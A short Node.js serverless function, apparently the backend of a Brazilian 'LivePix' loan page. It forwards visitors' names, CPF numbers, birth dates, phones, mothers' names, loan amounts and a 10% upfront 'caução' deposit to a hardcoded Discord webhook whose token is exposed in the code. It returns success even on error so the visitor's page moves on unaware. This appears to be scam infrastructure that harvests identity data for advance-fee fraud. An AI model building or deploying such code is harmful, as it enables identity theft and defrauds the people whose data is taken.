const axios = require('axios');

exports.handler = async (event) => {
    // Sua URL do Discord configurada
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1461123914964013148/xlGjXfAU4EckmXTFDj80nPANGO2D9u52bZ7cgHhyrqnm4PNAcz-XwQt66-w8uJChbEjr";

    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        const data = JSON.parse(event.body);
        
        const embed = {
            title: "🚀 NOVO LEAD - LIVEPIX V2",
            color: 3066993, // Verde
            fields: [
                { name: "👤 Nome", value: data.nome || "Não informado", inline: true },
                { name: "🆔 CPF", value: data.cpf || "Não informado", inline: true },
                { name: "🎂 Nascimento", value: data.nascimento || "Não informado", inline: true },
                { name: "📞 Telefone", value: data.telefone || "Não informado", inline: false },
                { name: "👩 Mãe", value: data.mae || "Não informado", inline: false },
                { name: "💰 Valor Solicitado", value: `R$ ${data.valor}`, inline: true },
                { name: "💸 Caução (10%)", value: `R$ ${data.caucao}`, inline: true }
            ],
            footer: { text: "Sistema de Monitoramento LivePix" },
            timestamp: new Date()
        };

        await axios.post(DISCORD_WEBHOOK_URL, { embeds: [embed] });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Lead notificado com sucesso" })
        };
    } catch (error) {
        console.error("Erro ao enviar para Discord:", error.message);
        // Retornamos 200 para que o usuário no site mude de página normalmente
        return { statusCode: 200, body: "Erro interno, mas lead processado" };
    }
};